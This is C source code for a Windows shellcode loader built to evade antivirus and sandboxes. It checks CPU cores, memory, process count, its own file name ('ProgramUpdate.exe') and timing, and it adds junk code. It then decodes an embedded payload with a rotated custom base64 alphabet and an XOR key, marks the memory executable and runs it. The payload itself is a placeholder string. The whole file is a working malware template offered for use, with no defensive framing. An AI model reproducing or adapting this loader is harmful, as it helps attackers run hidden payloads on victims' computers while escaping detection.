#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <tlhelp32.h>
#define ORIGINAL_FILENAME "ProgramUpdate.exe"

int is_more_than_2_cores() {
    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);
    int core_count = sys_info.dwNumberOfProcessors;
    return (core_count > 2) ? 10 : 5;
}

int get_process_count() {
    DWORD processCount = 0;
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return -1;
    }
    do {
        processCount++;
    } while (Process32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);
    return (processCount > 50) ? 10 : 5; 
}

int is_memory_more_than_2048MB() {
    MEMORYSTATUSEX memStat;
    memStat.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memStat)) {
        unsigned long long totalMemInMB = memStat.ullTotalPhys / (1024 * 1024);
        return (totalMemInMB > 2048) ? 10 : 5;
    } else {
        return -1;
    }
}

int is_file_renamed() {
    char current_path[MAX_PATH];
    if (GetModuleFileNameA(NULL, current_path, MAX_PATH)) {
        char *current_filename = strrchr(current_path, '\\');
        if (current_filename) {
            current_filename++;
            if (strcmp(current_filename, ORIGINAL_FILENAME) == 0) {
                return 10;
            } else {
                return 3;
            }
        }
    }
    return -1;
}

void adjust_first_to_last(char *array) {
    int length = strlen(array);
    if (length > 1) {
        char first_char = array[0];
        for (int i = 1; i < length; i++) {
            array[i - 1] = array[i];
        }
        array[length - 1] = first_char;
    }
}

int base64_decode(unsigned char *input, unsigned char **output, int len, char *base64_table, int base64_table_iv) {
    if (len % 4 != 0){
        len++;
    }
    for(long i = 0; i<base64_table_iv; i++){
        adjust_first_to_last(base64_table);
    }
    int output_len = len / 4 * 3;
    if (input[len - 1] == '=') output_len--;
    if (input[len - 2] == '=') output_len--;
    *output = (unsigned char *)malloc(output_len);
    if (*output == NULL) return 0;
    for (int i = 0, j = 0; i < len;) {
        int a = input[i] == '=' ? 0 : strchr(base64_table, input[i]) - base64_table;
        int b = input[i + 1] == '=' ? 0 : strchr(base64_table, input[i + 1]) - base64_table;
        int c = input[i + 2] == '=' ? 0 : strchr(base64_table, input[i + 2]) - base64_table;
        int d = input[i + 3] == '=' ? 0 : strchr(base64_table, input[i + 3]) - base64_table;
        (*output)[j++] = (a << 2) | (b >> 4);
        if (input[i + 2] != '=') (*output)[j++] = (b << 4) | (c >> 2);
        if (input[i + 3] != '=') (*output)[j++] = (c << 6) | d;
        i += 4;
    }
    return output_len;
}

void del_characters(unsigned char * start, unsigned char * end, int interval_num, int len) {
    int flag = 0;
    for (int i = 1; i < len; ++i) {
        if ( i % interval_num == 0 ) {
            ++i;
        } 
        end[flag] = start[i];
        ++flag;
    }
}

void xor_encrypt_decrypt(unsigned char *input, unsigned char *output, char *key, int len) {
    int key_length = strlen(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ key[i % key_length];
    }
    output[len] = '\0';
}

int is_wechat_installed() {
    if (GetFileAttributes("C:\\Program Files (x86)\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributes("C:\\Program Files\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES) {
        return 1;
    }
    return 0;
}

void excess_code() {
    if (is_wechat_installed() == 0) {
        is_wechat_installed();
    } else {
        is_wechat_installed();
    }
}

int main() {
    excess_code();
    int flag;
    unsigned char *decoded = NULL;
    void *exec_mem = NULL;
    unsigned char decrypted[4096];
    unsigned char shellcode_src[] = "your encrypt shellcode";
    char base64_table[] = "T45WmNOPrpSq+sUByz0YZklMi78wEFGHI16KLh3txDXabcJdefAg9jCV2uvno/QR";
    char key[] = "z0defKjCeMhi7Iwx9!Ag16+8NAGH45LV239OPr&DEFUBy/QR*)WmnopuvYZklstTSqra0(3XabcJ7";
    long base64_table_iv = 3333333;
    long key_iv = 99999999;
    clock_t start, end;
    int cpu_time_used;
    flag = is_file_renamed();
    base64_table_iv = base64_table_iv + flag - 10;
    key_iv = key_iv + flag - 10;
    if (flag < 10) {
        goto exit;
    }
    start = clock();
    Sleep(2000);
    end = clock();
    cpu_time_used = ((double) (end - start)) / CLOCKS_PER_SEC;
    int interval_num = shellcode_src[0] - 48;
    unsigned char shellcode[2048];
    del_characters(shellcode_src, shellcode, interval_num, strlen(shellcode_src));
    base64_table_iv = base64_table_iv + 2 - cpu_time_used;
    key_iv = key_iv + 2 - cpu_time_used;
    if (cpu_time_used < 1) {
        goto exit;
    }
    flag = is_more_than_2_cores();
    base64_table_iv = base64_table_iv + flag - 10;
    key_iv = key_iv + flag - 10;
    if (flag < 10) {
        goto exit;
    }
    flag = is_memory_more_than_2048MB();
    base64_table_iv = base64_table_iv + flag - 10;
    key_iv = key_iv + flag - 10;
    if (flag < 10) {
        goto exit;
    }
    flag = get_process_count();
    base64_table_iv = base64_table_iv + flag - 10;
    key_iv = key_iv + flag - 10;
    if (flag < 10) {
        goto exit;
    }
    int shellcode_len = strlen(shellcode) - 1;
    int decoded_len = base64_decode(shellcode, &decoded, shellcode_len, base64_table, base64_table_iv);
    for(int i = shellcode_len/4*3-1; i>=0 ; i--){
        if (decoded_len <= 5) { goto exit; }
        if (decoded[i] != '\x00') {
            for(long i = 0; i<key_iv; i++){
                adjust_first_to_last(key);
            }
            xor_encrypt_decrypt(decoded, decrypted, key, decoded_len);
            DWORD oldProtect;
            if (!VirtualProtect(decrypted, sizeof(decrypted), PAGE_EXECUTE_READ, &oldProtect)) {
                return -1;
            }
            break;
        }
    }
    ((void(WINAPI*)(void))decrypted)();
    exit: return 0;
}